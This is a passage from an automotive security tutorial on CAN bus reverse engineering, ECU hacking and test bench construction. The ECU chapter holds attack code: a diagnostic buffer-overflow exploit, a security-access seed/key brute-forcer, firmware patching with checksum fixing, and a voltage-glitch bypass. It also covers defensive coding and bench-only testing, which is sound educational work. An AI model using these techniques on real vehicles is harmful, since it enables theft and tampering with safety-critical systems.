# 4. Analyze for patterns
python3 analyze_patterns.py all_traffic.log
```

### Exercise 2: Door Lock Reverse Engineering
```bash
#!/bin/bash
# Complete door lock analysis

echo "Door Lock Reverse Engineering"
echo "==============================="

# Record baseline
echo "Recording baseline (no actions)..."
candump can0 > baseline.log &
sleep 5
kill $!

# Record lock action
echo "Press LOCK button in 3 seconds"
countdown 3
candump can0 > lock.log &
PID=$!
sleep 2
kill $PID

# Record unlock action  
echo "Press UNLOCK button in 3 seconds"
countdown 3
candump can0 > unlock.log &
PID=$!
sleep 2  
kill $PID

# Find differences
echo "Analyzing differences..."
diff baseline.log lock.log | grep "^>" | head -5
diff baseline.log unlock.log | grep "^>" | head -5

echo "Test the identified messages manually:"
echo "Lock candidates:"
diff baseline.log lock.log | grep "^>" | head -3
echo "Unlock candidates:"  
diff baseline.log unlock.log | grep "^>" | head -3
```

### Exercise 3: Signal Correlation Analysis
```python
#!/usr/bin/env python3
"""
Correlate multiple vehicle signals to understand relationships
"""

import re
import collections
from datetime import datetime

def parse_candump_log(filename):
    """Parse candump log file"""
    messages = collections.defaultdict(list)
    
    with open(filename, 'r') as f:
        for line in f:
            # Match: (timestamp) interface id#data
            match = re.match(r'\(([\d.]+)\) (\w+) ([0-9A-F]+)#([0-9A-F]*)', line.strip())
            if match:
                timestamp, interface, msg_id, data = match.groups()
                messages[msg_id].append({
                    'timestamp': float(timestamp),
                    'data': data
                })
    
    return messages

def find_correlations(messages, time_window=1.0):
    """Find signals that change within the same time window"""
    
    all_changes = []
    
    # Find all data changes
    for msg_id, frames in messages.items():
        prev_data = None
        for frame in frames:
            if prev_data and frame['data'] != prev_data:
                all_changes.append({
                    'timestamp': frame['timestamp'],
                    'msg_id': msg_id,
                    'old_data': prev_data,
                    'new_data': frame['data']
                })
            prev_data = frame['data']
    
    # Sort by timestamp
    all_changes.sort(key=lambda x: x['timestamp'])
    
    # Find correlated changes
    correlations = []
    
    for i, change in enumerate(all_changes):
        correlated = []
        
        # Look for other changes within time window
        for j in range(i+1, len(all_changes)):
            time_diff = all_changes[j]['timestamp'] - change['timestamp']
            
            if time_diff > time_window:
                break
                
            if all_changes[j]['msg_id'] != change['msg_id']:
                correlated.append(all_changes[j])
        
        if correlated:
            correlations.append({
                'primary': change,
                'correlated': correlated,
                'time_window': time_window
            })
    
    return correlations

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 correlate.py <candump_log>")
        sys.exit(1)
    
    messages = parse_candump_log(sys.argv[1])
    correlations = find_correlations(messages)
    
    print("Signal Correlations Found:")
    print("=" * 40)
    
    for corr in correlations[:10]:  # Show first 10
        primary = corr['primary']
        print(f"Primary: {primary['msg_id']} at {primary['timestamp']:.3f}s")
        print(f"  {primary['old_data']} -> {primary['new_data']}")
        
        for cor_change in corr['correlated']:
            print(f"Correlated: {cor_change['msg_id']} at {cor_change['timestamp']:.3f}s")
            print(f"  {cor_change['old_data']} -> {cor_change['new_data']}")
        
        print()
```

---

# Chapter 6: ECU Hacking 🔓

## ECU Architecture Overview

### Common ECU Components

**Microcontroller:**
- ARM Cortex, PowerPC, or proprietary core
- Flash memory for firmware storage
- RAM for runtime operations
- EEPROM for configuration data

**Communication Interfaces:**
- CAN controllers and transceivers
- LIN interfaces for slave devices  
- Diagnostic interfaces (K-Line, etc.)
- Programming interfaces (BDM, JTAG, SWD)

**Power Management:**
- Voltage regulators
- Power-on reset circuits
- Low-power sleep modes
- Watchdog timers

### Boot Process

#### Bootloader Stages
1. **Primary Bootloader (ROM):**
   - Immutable code in MCU ROM
   - Initializes basic hardware
   - Validates secondary bootloader

2. **Secondary Bootloader (Flash):**
   - Updateable bootloader
   - Handles communication protocols
   - Validates application firmware

3. **Application Firmware:**
   - Main ECU functionality
   - Vehicle-specific logic
   - Runtime diagnostics

#### Security Mechanisms
- **Code Signing:** Digital signatures on firmware
- **Secure Boot:** Cryptographic verification chain
- **Debug Lock:** Disabling debug interfaces in production
- **Memory Protection:** MPU/MMU restrictions

## Firmware Analysis

### Firmware Extraction Methods

#### JTAG/SWD Interface
```bash
# Using OpenOCD
openocd -f interface/stlink-v2.cfg -f target/stm32f4x.cfg

# Connect via telnet
telnet localhost 4444

# Dump flash memory
> halt
> flash read_bank 0 firmware.bin 0x0 0x100000
> exit
```

#### BDM (Background Debug Mode)
```bash
# Using BDM tools for Freescale/NXP MCUs
bdm_dump -device=MPC5643L -output=firmware.bin
```

#### Bootloader Exploitation
```python
import can
import time

def exploit_bootloader_unlock():
    """Example bootloader unlock sequence"""
    
    bus = can.interface.Bus('can0', bustype='socketcan')
    
    # Enter programming mode
    unlock_sequence = [
        can.Message(arbitration_id=0x7E0, data=[0x10, 0x02]),  # Programming session
        can.Message(arbitration_id=0x7E0, data=[0x27, 0x01]),  # Request seed
        # Calculate and send key (implementation-specific)
        can.Message(arbitration_id=0x7E0, data=[0x27, 0x02, 0x12, 0x34]),  # Send key
    ]
    
    for msg in unlock_sequence:
        bus.send(msg)
        time.sleep(0.1)
        
        # Read response
        response = bus.recv(timeout=1.0)
        if response:
            print(f"Response: {response}")
```

### Firmware Format Analysis

#### Common Formats

**Intel HEX:**
```
:10010000214601360121470136007EFE09D219012A
:10011000194E79234623965778239EDA3F01B2CAF2
:00000001FF
```

**Motorola S-Record:**
```
S00F000068656C6C6F202020202000003C
S11F00007C0802A6900100049421FFF0907F0004A01F
S5030001FB
S9030000FC
```

**Binary Format:**
```bash
# Analyze binary structure
hexdump -C firmware.bin | head -20

# Look for:
# - Boot vectors at start
# - String tables
# - Checksum locations
# - Update headers
```

#### Reverse Engineering Tools

**Ghidra (Free NSA Tool):**
```bash
# Open firmware.bin in Ghidra
# 1. Create new project
# 2. Import binary file
# 3. Select appropriate processor (ARM, PowerPC, etc.)
# 4. Analyze and explore functions
```

**IDA Pro (Commercial):**
```bash
# Professional disassembler
# Superior auto-analysis
# Extensive processor support
# Plugin ecosystem
```

**Binwalk (Firmware Analysis):**
```bash
# Analyze firmware structure
binwalk firmware.bin

# Extract filesystems
binwalk -e firmware.bin

# Look for:
# - Embedded filesystems (JFFS2, YAFFS, etc.)
# - Compression (gzip, LZMA)
# - Cryptographic signatures
# - Boot loaders
```

## ECU Attack Vectors

### Memory Corruption

#### Buffer Overflow Exploitation
```c
// Example vulnerable ECU function
void process_diagnostic_data(uint8_t* data, uint16_t length) {
    uint8_t buffer[64];  // Fixed-size buffer
    
    // Vulnerable: no bounds checking
    memcpy(buffer, data, length);  // Potential overflow
    
    // Process buffer...
}

// Exploit via ISO-TP
uint8_t payload[200];  // Larger than buffer
memset(payload, 0x41, sizeof(payload));  // Fill with 'A'

// Overwrite return address at specific offset
*(uint32_t*)(payload + 68) = 0x08001234;  // Jump to shellcode

// Send via diagnostic message
send_iso_tp_message(0x7E0, payload, sizeof(payload));
```

#### Stack Canary Bypass
```c
// Modern ECUs may use stack canaries
void vulnerable_function(uint8_t* input) {
    uint32_t canary = __stack_chk_guard;
    uint8_t buffer[64];
    
    // Vulnerable operation
    strcpy(buffer, input);  // No bounds check
    
    // Canary check before return
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Abort on mismatch
    }
}

// Bypass: leak canary value first
// 1. Partial overwrite to leak canary
// 2. Use leaked value in full exploit
```

### Firmware Modification

#### Patch Application
```python
def apply_firmware_patch(firmware_path, patches):
    """Apply binary patches to firmware"""
    
    with open(firmware_path, 'rb') as f:
        firmware = bytearray(f.read())
    
    for patch in patches:
        offset = patch['offset']
        old_bytes = patch['old']
        new_bytes = patch['new']
        
        # Verify current bytes match expected
        current = firmware[offset:offset+len(old_bytes)]
        if current != old_bytes:
            print(f"Patch mismatch at {offset:08X}")
            continue
        
        # Apply patch
        firmware[offset:offset+len(old_bytes)] = new_bytes
        print(f"Applied patch at {offset:08X}")
    
    # Write patched firmware
    with open(firmware_path + '.patched', 'wb') as f:
        f.write(firmware)

# Example patches
patches = [
    {
        'offset': 0x8000,
        'old': b'\x01\x02\x03\x04',
        'new': b'\x90\x90\x90\x90'  # NOP sled
    },
    {
        'offset': 0x9000,
        'old': b'\xBE\xEF',
        'new': b'\x12\x34'  # Change constant
    }
]

apply_firmware_patch('firmware.bin', patches)
```

#### Checksum Bypass
```python
def fix_firmware_checksum(firmware_path):
    """Recalculate and fix firmware checksum"""
    
    with open(firmware_path, 'rb') as f:
        firmware = bytearray(f.read())
    
    # Common checksum locations (vary by manufacturer)
    checksum_locations = [
        {'start': 0x0000, 'end': 0x7FFC, 'checksum_addr': 0x7FFC},
        {'start': 0x8000, 'end': 0xFFFC, 'checksum_addr': 0xFFFC},
    ]
    
    for location in checksum_locations:
        start = location['start']
        end = location['end']
        checksum_addr = location['checksum_addr']
        
        # Calculate checksum (example: simple sum)
        data = firmware[start:end]
        checksum = sum(data) & 0xFFFFFFFF
        
        # Update checksum in firmware
        firmware[checksum_addr:checksum_addr+4] = checksum.to_bytes(4, 'big')
        
        print(f"Updated checksum at {checksum_addr:08X}: {checksum:08X}")
    
    with open(firmware_path, 'wb') as f:
        f.write(firmware)
```

### Privilege Escalation

#### Security Access Bypass
```python
def brute_force_security_key(bus, ecu_id, max_attempts=10):
    """Attempt to brute force ECU security key"""
    
    # Request seed
    seed_request = can.Message(arbitration_id=ecu_id, data=[0x27, 0x01])
    bus.send(seed_request)
    
    response = bus.recv(timeout=1.0)
    if not response or response.data[0] == 0x7F:
        print("Failed to get seed")
        return False
    
    # Extract seed from response
    seed = int.from_bytes(response.data[2:], 'big')
    print(f"Received seed: {seed:04X}")
    
    # Try common key algorithms
    key_algorithms = [
        lambda s: s ^ 0x1234,           # Simple XOR
        lambda s: (s + 0x5555) & 0xFFFF,  # Add constant
        lambda s: s,                    # Echo (insecure)
        lambda s: (~s) & 0xFFFF,        # Bitwise NOT
    ]
    
    for attempt, algorithm in enumerate(key_algorithms):
        if attempt >= max_attempts:
            break
            
        key = algorithm(seed)
        
        # Send key
        key_request = can.Message(
            arbitration_id=ecu_id, 
            data=[0x27, 0x02] + list(key.to_bytes(2, 'big'))
        )
        bus.send(key_request)
        
        response = bus.recv(timeout=1.0)
        if response and response.data[0] == 0x67:
            print(f"Success! Key: {key:04X}")
            return True
        
        print(f"Attempt {attempt+1} failed: {key:04X}")
        time.sleep(1)  # Rate limiting
    
    return False
```

## Hardware Analysis

### Debug Interface Identification

#### JTAG Pinout Detection
```bash
# Use JTAGulator or similar tool
jtag_scan --start-pin=1 --end-pin=20 --voltage=3.3

# Common JTAG pins:
# TMS  - Test Mode Select
# TCK  - Test Clock  
# TDI  - Test Data In
# TDO  - Test Data Out
# TRST - Test Reset (optional)
```

#### UART Detection
```python
import serial
import time

def scan_uart_pins(pin_range):
    """Scan for UART interfaces on test points"""
    
    for tx_pin in pin_range:
        for rx_pin in pin_range:
            if tx_pin == rx_pin:
                continue
                
            try:
                # Try common baud rates
                baud_rates = [9600, 19200, 38400, 57600, 115200]
                
                for baud in baud_rates:
                    print(f"Trying TX:{tx_pin} RX:{rx_pin} Baud:{baud}")
                    
                    # This would require actual hardware setup
                    # ser = serial.Serial(f'/dev/ttyUSB{tx_pin}', baud, timeout=1)
                    # data = ser.read(100)
                    # if b'boot' in data.lower() or b'debug' in data.lower():
                    #     print(f"Found UART: TX:{tx_pin} RX:{rx_pin} Baud:{baud}")
                    
            except Exception as e:
                continue
```

### Power Analysis

#### Voltage Glitching
```python
class VoltageGlitcher:
    """Simple voltage glitch generator"""
    
    def __init__(self, power_control_pin):
        self.power_pin = power_control_pin
        
    def glitch(self, delay_ms, duration_us):
        """Generate voltage glitch at specific timing"""
        
        time.sleep(delay_ms / 1000.0)  # Delay to target instruction
        
        # Cut power briefly
        self.set_power(False)
        time.sleep(duration_us / 1000000.0)  # Microsecond glitch
        self.set_power(True)
        
    def set_power(self, state):
        """Control power to target ECU"""
        # Implementation depends on hardware setup
        pass

# Usage for bypassing security checks
def glitch_security_check():
    """Glitch during security access validation"""
    
    glitcher = VoltageGlitcher(power_pin=1)
    
    # Send security access request
    send_message([0x27, 0x02, 0x00, 0x00])  # Wrong key
    
    # Glitch during validation (timing is critical)
    glitcher.glitch(delay_ms=10, duration_us=100)
    
    # Check if bypass successful
    response = read_response()
    if response and response[0] == 0x67:
        print("Security bypass successful!")
```

## Secure Development Practices

### Code Protection

#### Stack Canaries
```c
// Enable stack protection
void secure_function(uint8_t* input) {
    // Compiler inserts canary automatically with -fstack-protector
    uint8_t buffer[64];
    
    // Safe string operation
    strlcpy(buffer, input, sizeof(buffer));
}
```

#### Address Space Layout Randomization (ASLR)
```c
// Randomize memory layout to prevent ROP attacks
// Limited effectiveness in embedded systems due to:
// - Fixed memory maps
// - Real-time requirements
// - Resource constraints
```

#### Control Flow Integrity (CFI)
```c
// Compiler-based CFI protection
// Validates indirect calls and jumps
// Prevents ROP/JOP attacks
```

### Input Validation

#### Secure Message Processing
```c
typedef struct {
    uint16_t id;
    uint8_t dlc;
    uint8_t data[8];
    uint32_t checksum;
} secure_can_message_t;

int process_secure_message(secure_can_message_t* msg) {
    // 1. Validate message structure
    if (msg->dlc > 8) {
        return -1;  // Invalid DLC
    }
    
    // 2. Verify checksum
    uint32_t calculated_checksum = calculate_checksum(msg->data, msg->dlc);
    if (calculated_checksum != msg->checksum) {
        return -2;  // Checksum mismatch
    }
    
    // 3. Validate ID against whitelist
    if (!is_authorized_id(msg->id)) {
        return -3;  // Unauthorized ID
    }
    
    // 4. Process message safely
    return handle_authorized_message(msg);
}
```

## Practical ECU Exercises

### Exercise 1: Firmware Analysis Setup

```bash
#!/bin/bash
# Set up firmware analysis environment

echo "Setting up ECU firmware analysis tools..."

# Install binwalk
git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
sudo python3 setup.py install

# Install Ghidra (requires manual download from NSA)
echo "Download Ghidra from: https://ghidra-sre.org/"
echo "Extract to /opt/ghidra"

# Install additional tools
sudo apt-get install hexdump xxd strings file

# Analyze sample firmware
echo "Analyzing firmware.bin..."
binwalk firmware.bin
strings firmware.bin | grep -i "version\|debug\|test"
hexdump -C firmware.bin | head -20

echo "Setup complete!"
```

### Exercise 2: Safe ECU Communication Test

```python
#!/usr/bin/env python3
"""
Safe ECU communication testing
ONLY use on bench ECUs, never on vehicle systems
"""

import can
import time
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SafeECUTester:
    def __init__(self, interface='can0'):
        self.bus = can.interface.Bus(interface, bustype='socketcan')
        self.ecu_id = 0x7E0
        self.ecu_response_id = 0x7E8
        
    def test_basic_communication(self):
        """Test basic ECU communication"""
        
        logger.info("Testing basic communication...")
        
        # Send tester present
        msg = can.Message(
            arbitration_id=self.ecu_id,
            data=[0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
            is_extended_id=False
        )
        
        self.bus.send(msg)
        
        # Wait for response
        response = self.bus.recv(timeout=1.0)
        
        if response and response.arbitration_id == self.ecu_response_id:
            logger.info(f"ECU responded: {response}")
            return True
        else:
            logger.warning("No response from ECU")
            return False
    
    def read_ecu_info(self):
        """Read ECU identification information"""
        
        logger.info("Reading ECU information...")
        
        # Read VIN
        vin_msg = can.Message(
            arbitration_id=self.ecu_id,
            data=[0x03, 0x22, 0xF1, 0x90, 0x00, 0x00, 0x00, 0x00],
            is_extended_id=False
        )
        
        self.bus.send(vin_msg)
        
        response = self.bus.recv(timeout=1.0)
        if response:
            logger.info(f"VIN response: {response}")
        
        # Read software version
        sw_msg = can.Message(
            arbitration_id=self.ecu_id,
            data=[0x03, 0x22, 0xF1, 0x94, 0x00, 0x00, 0x00, 0x00],
            is_extended_id=False
        )
        
        self.bus.send(sw_msg)
        
        response = self.bus.recv(timeout=1.0)
        if response:
            logger.info(f"Software version: {response}")

# Example usage
if __name__ == "__main__":
    tester = SafeECUTester()
    
    if tester.test_basic_communication():
        tester.read_ecu_info()
    else:
        logger.error("Communication test failed")
```

### Exercise 3: Firmware Checksum Analysis

```python
#!/usr/bin/env python3
"""
Analyze firmware checksums and integrity mechanisms
"""

def analyze_firmware_integrity(firmware_path):
    """Analyze firmware for integrity mechanisms"""
    
    with open(firmware_path, 'rb') as f:
        firmware = f.read()
    
    print(f"Firmware size: {len(firmware)} bytes")
    
    # Look for common checksum patterns
    checksum_candidates = []
    
    # Check last 4 bytes (common checksum location)
    last_4_bytes = firmware[-4:]
    checksum = int.from_bytes(last_4_bytes, 'big')
    print(f"Last 4 bytes (potential checksum): {checksum:08X}")
    
    # Calculate simple checksums
    checksums = {
        'sum8': sum(firmware[:-4]) & 0xFF,
        'sum16': sum(firmware[:-4]) & 0xFFFF,
        'sum32': sum(firmware[:-4]) & 0xFFFFFFFF,
        'crc32': calculate_crc32(firmware[:-4]),
    }
    
    print("Calculated checksums:")
    for name, value in checksums.items():
        print(f"  {name}: {value:08X}")
        
        if value == checksum:
            print(f"  *** MATCH: {name} ***")
    
    # Look for multiple checksum regions
    analyze_checksum_regions(firmware)

def calculate_crc32(data):
    """Simple CRC32 calculation"""
    import zlib
    return zlib.crc32(data) & 0xFFFFFFFF

def analyze_checksum_regions(firmware):
    """Look for multiple checksum regions"""
    
    # Common region boundaries (powers of 2)
    boundaries = [0x1000, 0x2000, 0x4000, 0x8000, 0x10000, 0x20000]
    
    for boundary in boundaries:
        if boundary + 4 < len(firmware):
            region_data = firmware[:boundary]
            potential_checksum = firmware[boundary:boundary+4]
            
            if len(potential_checksum) == 4:
                checksum_value = int.from_bytes(potential_checksum, 'big')
                calculated = sum(region_data) & 0xFFFFFFFF
                
                if calculated == checksum_value:
                    print(f"Found checksum region: 0x0000-0x{boundary:04X}")
                    print(f"  Checksum at: 0x{boundary:04X}")
                    print(f"  Value: {checksum_value:08X}")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 checksum_analysis.py <firmware.bin>")
        sys.exit(1)
    
    analyze_firmware_integrity(sys.argv[1])
```

---

# Chapter 7: Building and Using ECU Test Benches 🔬

## Test Bench Design Principles

### Safety Requirements

**Electrical Safety:**
- Current-limited power supplies
- Fused connections
- Ground fault protection
- Emergency stop switches
- Clear labeling of voltages

**Network Isolation:**
- Separate test networks from production
- No connection to operational vehicles
- Isolated CAN buses with proper termination
- Controlled message injection

**Documentation:**
- Detailed wiring diagrams
- Component specifications
- Safety procedures
- Test protocols

### Basic Bench Components

#### Power Supply Requirements
```bash
# ECU Power Requirements (typical):
# - 12V main power (9-16V range)
# - Current limiting: 5-10A max
# - Stable voltage regulation
# - Over-current protection

# Recommended specs:
# - Adjustable voltage: 9-16V
# - Current limit: 10A
# - Short circuit protection
# - Digital displays for V/A monitoring
```

#### CAN Bus Network Setup
```bash
# Proper CAN bus termination:
# - 120Ω resistors at both ends
# - Twisted pair wiring (CANH/CANL)
# - Common ground reference
# - Maximum network length: 1000m @ 125kbps

# Network topology:
# ECU1 ---- ECU2 ---- ECU3
#  |         |         |
# 120Ω               120Ω
```

## Hardware Setup

### ECU Connector Breakout

#### Creating Breakout Boxes
```python
def create_breakout_documentation(ecu_model, pin_count):
    """Document ECU breakout box connections"""
    
    breakout_map = {
        'power': {
            'pin_12v': [1, 15, 30],  # Common 12V pins
            'pin_ground': [5, 18, 31],  # Ground pins
            'pin_switched': [8],  # Switched 12V
        },
        'can': {
            'can_h': [6],
            'can_l': [14],
            'can_gnd': [5],
        },
        'sensors': {
            'analog_inputs': [2, 3, 4, 7],
            'digital_inputs': [9, 10, 11, 12],
            'pwm_outputs': [13, 16, 17],
        },
        'diagnostics': {
            'k_line': [7],
            'l_line': [15],
        }
    }
    
    print(f"ECU Breakout Map: {ecu_model} ({pin_count} pins)")
    print("=" * 50)
    
    for category, pins in breakout_map.items():
        print(f"\n{category.upper()}:")
        for signal, pin_list in pins.items():
            print(f"  {signal}: pins {pin_list}")
    
    return breakout_map

# Example usage
create_breakout_documentation("Generic ECU", 64)
```

#### Harness Construction
```bash
# ECU harness construction checklist:

1. Connector Selection:
   - Automotive grade connectors (AMP, Delphi, etc.)
   - Proper sealing for test environment
   - Gold-plated contacts for reliability

2. Wire Specification:
   - Automotive wire (SAE J1128)
   - Appropriate gauge for current
   - Color coding per standards

3. Shielding:
   - Shielded pairs for CAN signals
   - Proper shield termination
   - Separate analog/digital grounds

4. Documentation:
   - Wire color assignments
   - Pin-to-pin mapping
   - Test point locations
```

### CAN Interface Selection

#### USB-CAN Adapters
```python
can_interfaces = {
    'peak_pcan': {
        'type': 'Peak PCAN-USB',
        'channels': 1,
        'isolation': True,
        'linux_driver': 'peak_usb',
        'setup_cmd': 'sudo modprobe peak_usb',
        'cost': '$$'
    },
    'kvaser_leaf': {
        'type': 'Kvaser Leaf Light HS v2',
        'channels': 1,
        'isolation': True,
        'linux_driver': 'kvaser_usb',
        'setup_cmd': 'sudo modprobe kvaser_usb',
        'cost': '$$$'
    },
    'elm327_clone': {
        'type': 'ELM327 Clone',
        'channels': 1,
        'isolation': False,
        'linux_driver': 'slcan',
        'setup_cmd': 'sudo slcand -o -s6 /dev/ttyUSB0',
        'cost': '$'
    },
    'canable': {
        'type': 'CANable (Open Source)',
        'channels': 1,
        'isolation': True,
        'linux_driver': 'gs_usb',
        'setup_cmd': 'automatic',
        'cost': '$'
    }
}

def select_can_interface(requirements):
    """Help select appropriate CAN interface"""
    
    print("CAN Interface Selection Guide:")
    print("=" * 40)
    
    for name, specs in can_interfaces.items():
        score = 0
        
        if requirements.get('isolation') and specs['isolation']:
            score += 2
        if requirements.get('budget') == 'low' and specs['cost'] == '$':
            score += 2
        if requirements.get('budget') == 'high' and specs['cost'] == '$$$':
            score += 1
        
        print(f"\n{specs['type']} (Score: {score})")
        print(f"  Channels: {specs['channels']}")
        print(f"  Isolation: {specs['isolation']}")
        print(f"  Driver: {specs['linux_driver']}")
        print(f"  Setup: {specs['setup_cmd']}")
        print(f"  Cost: {specs['cost']}")

# Example usage
select_can_interface({
    'isolation': True,
    'budget': 'medium'
})
```

## Test Network Simulation

### Multi-ECU Networks

#### Gateway Simulation
```python
class CANGateway:
    """Simulate CAN gateway behavior"""
    
    def __init__(self, network1_interface, network2_interface):
        self.net1 = can.interface.Bus(network1_interface, bustype='socketcan')
        self.net2 = can.interface.Bus(network2_interface, bustype='socketcan')
        
        self.routing_table = {
            # Route messages between networks
            0x123: 'net1_to_net2',
            0x456: 'net2_to_net1',
        }
        
        self.filtering_rules = {
            # Block certain messages
            'blocked_ids': [0x666, 0x777],
            'allowed_sources': ['net1', 'net2'],
        }
    
    def start_gateway(self):
        """Start gateway operation"""
        import threading
        
        # Start routing threads
        t1 = threading.Thread(target=self.route_net1_to_net2)
        t2 = threading.Thread(target=self.route_net2_to_net1)
        
        t1.daemon = True
        t2.daemon = True
        
        t1.start()
        t2.start()
        
        print("Gateway started")
    
    def route_net1_to_net2(self):
        """Route messages from network 1 to network 2"""
        while True:
            msg = self.net1.recv(timeout=1.0)
            if msg:
                if self.should_route(msg, 'net1_to_net2'):
                    # Modify ID if needed
                    routed_msg = self.modify_message(msg, 'net1_to_net2')
                    self.net2.send(routed_msg)
    
    def route_net2_to_net1(self):
        """Route messages from network 2 to network 1"""
        while True:
            msg = self.net2.recv(timeout=1.0)
            if msg:
                if self.should_route(msg, 'net2_to_net1'):
                    routed_msg = self.modify_message(msg, 'net2_to_net1')
                    self.net1.send(routed_msg)
    
    def should_route(self, msg, direction):
        """Determine if message should be routed"""
        
        # Check blocked IDs
        if msg.arbitration_id in self.filtering_rules['blocked_ids']:
            return False
        
        # Check routing rules
        if msg.arbitration_id in self.routing_table:
            return self.routing_table[msg.arbitration_id] == direction
        
        return False
    
    def modify_message(self, msg, direction):
        """Modify message during routing (ID translation, etc.)"""
        
        # Example: translate ID between networks
        id_translations = {
            'net1_to_net2': {0x123: 0x124},
            'net2_to_net1': {0x456: 0x457},
        }
        
        new_id = id_translations.get(direction, {}).get(msg.arbitration_id, msg.arbitration_id)
        
        return can.Message(
            arbitration_id=new_id,
            data=msg.data,
            is_extended_id=msg.is_extended_id
        )

# Usage
gateway = CANGateway('can0', 'can1')
gateway.start_gateway()
```

#### Network Load Simulation
```python
class NetworkLoadGenerator:
    """Generate realistic CAN network traffic"""
    
    def __init__(self, interface):
        self.bus = can.interface.Bus(interface, bustype='socketcan')
        self.running = False
    
    def generate_engine_messages(self):
        """Generate engine-related CAN messages"""
        import threading
        import random
        
        def engine_rpm_thread():
            rpm = 800  # Idle RPM
            
            while self.running:
                # Simulate RPM changes
                rpm += random.randint(-50, 100)
                rpm = max(600, min(6000, rpm))  # Keep in realistic range
                
                # Create RPM message
                rpm_data = rpm.to_bytes(2, 'big') + b'\x00' * 6
                msg = can.Message(arbitration_id=0x123, data=rpm_data)
                
                self.bus.send(msg)
                time.sleep(0.01)  # 100Hz update rate
        
        def engine_temp_thread():
            temp = 90  # Normal operating temp
            
            while self.running:
                temp += random.randint(-2, 3)
                temp = max(60, min(120, temp))
                
                temp_data = temp.to_bytes(1, 'big') + b'\x00' * 7
                msg = can.Message(arbitration_id=0x456, data=temp_data)
                
                self.bus.send(msg)
                time.sleep(1.0)  # 1Hz update rate
        
        # Start threads
        threading.Thread(target=engine_rpm_thread, daemon=True).start()
        threading.Thread(target=engine_temp_thread, daemon=True).start()
    
    def generate_body_messages(self):
        """Generate body control messages"""
        def door_status_thread():
            door_states = 0x00  # All doors closed
            
            while self.running:
                # Randomly toggle door states
                if random.random() < 0.1:  # 10% chance per second
                    door_states ^= random.choice([0x01, 0x02, 0x04, 0x08])
                
                door_data = door_states.to_bytes(1, 'big') + b'\x00' * 7
                msg = can.Message(arbitration_id=0x789, data=door_data)
                
                self.bus.send(msg)
                time.sleep(0.5)  # 2Hz update rate
        
        threading.Thread(target=door_status_thread, daemon=True).start()
    
    def start_generation(self):
        """Start all message generation"""
        self.running = True
        self.generate_engine_messages()
        self.generate_body_messages()
        print("Network load generation started")
    
    def stop_generation(self):
        """Stop message generation"""
        self.running = False
        print("Network load generation stopped")

# Usage
load_gen = NetworkLoadGenerator('can0')
load_gen.start_generation()
```

### Bench Control Software

#### Automated Test Execution
```python
class ECUTestBench:
    """Automated ECU test bench controller"""
    
    def __init__(self, config_file):
        self.config = self.load_config(config_file)
        self.setup_interfaces()
        self.setup_power_control()
        self.test_results = []
    
    def load_config(self, config_file):
        """Load test bench configuration"""
        import json
        
        with open(config_file, 'r') as f:
            return json.load(f)
    
    def setup_interfaces(self):
        """Initialize CAN interfaces"""
        self.interfaces = {}
        
        for name, config in self.config['interfaces'].items():
            self.interfaces[name] = can.interface.Bus(
                config['channel'], 
                bustype=config['bustype']
            )
    
    def setup_power_control(self):
        """Initialize power control (placeholder)"""
        # This would interface with actual power control hardware
        self.power_control = PowerController(self.config['power'])
    
    def run_test_sequence(self, test_name):
        """Run a specific test sequence"""
        
        test_config = self.config['tests'][test_name]
        results = {'test_name': test_name, 'steps': []}
        
        print(f"Starting test: {test_name}")
        
        try:
            # Power on ECU
            self.power_on_ecu()
            time.sleep(test_config.get('power_on_delay', 2))
            
            # Execute test steps
            for step in test_config['steps']:
                step_result = self.execute_test_step(step)
                results['steps'].append(step_result)
                
                if not step_result['passed']:
                    print(f"Step failed: {step['name']}")
                    if test_config.get('stop_on_failure', True):
                        break
            
            # Power off ECU
            self.power_off_ecu()
            
        except Exception as e:
            results['error'] = str(e)
            print(f"Test error: {e}")
        
        self.test_results.append(results)
        return results
    
    def execute_test_step(self, step):
        """Execute individual test step"""
        
        step_result = {
            'name': step['name'],
            'type': step['type'],
            'timestamp': time.time(),
            'passed': False,
            'details': {}
        }
        
        if step['type'] == 'send_message':
            return self.execute_send_message(step, step_result)
        elif step['type'] == 'expect_response':
            return self.execute_expect_response(step, step_result)
        elif step['type'] == 'delay':
            return self.execute_delay(step, step_result)
        else:
            step_result['error'] = f"Unknown step type: {step['type']}"
        
        return step_result
    
    def execute_send_message(self, step, result):
        """Send CAN message"""
        try:
            interface = self.interfaces[step['interface']]
            
            msg = can.Message(
                arbitration_id=step['id'],
                data=bytes.fromhex(step['data']),
                is_extended_id=step.get('extended', False)
            )
            
            interface.send(msg)
            result['passed'] = True
            result['details']['sent'] = f"{step['id']:03X}#{step['data']}"
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def execute_expect_response(self, step, result):
        """Wait for expected response"""
        try:
            interface = self.interfaces[step['interface']]
            timeout = step.get('timeout', 1.0)
            
            response = interface.recv(timeout=timeout)
            
            if response:
                expected_id = step.get('expected_id')
                expected_data = step.get('expected_data')
                
                result['details']['received'] = f"{response.arbitration_id:03X}#{response.data.hex().upper()}"
                
                if expected_id and response.arbitration_id != expected_id:
                    result['error'] = f"ID mismatch: got {response.arbitration_id:03X}, expected {expected_id:03X}"
                elif expected_data and response.data.hex().upper() != expected_data.upper():
                    result['error'] = f"Data mismatch: got {response.data.hex().upper()}, expected {expected_data.upper()}"
                else:
                    result['passed'] = True
            else:
                result['error'] = "No response received"
                
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def execute_delay(self, step, result):
        """Execute delay step"""
        try:
            delay = step.get('duration', 1.0)
            time.sleep(delay)
            result['passed'] = True
            result['details']['duration'] = delay
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def power_on_ecu(self):
        """Power on ECU"""
        # Interface with power control hardware
        print("Powering on ECU")
        self.power_control.set_power(True)
    
    def power_off_ecu(self):
        """Power off ECU"""
        print("Powering off ECU")
        self.power_control.set_power(False)
    
    def generate_report(self, output_file):
        """Generate test report"""
        import json
        
        report = {
            'timestamp': time.time(),
            'test_count': len(self.test_results),
            'results': self.test_results
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"Report saved to: {output_file}")

class PowerController:
    """Power supply controller interface"""
    
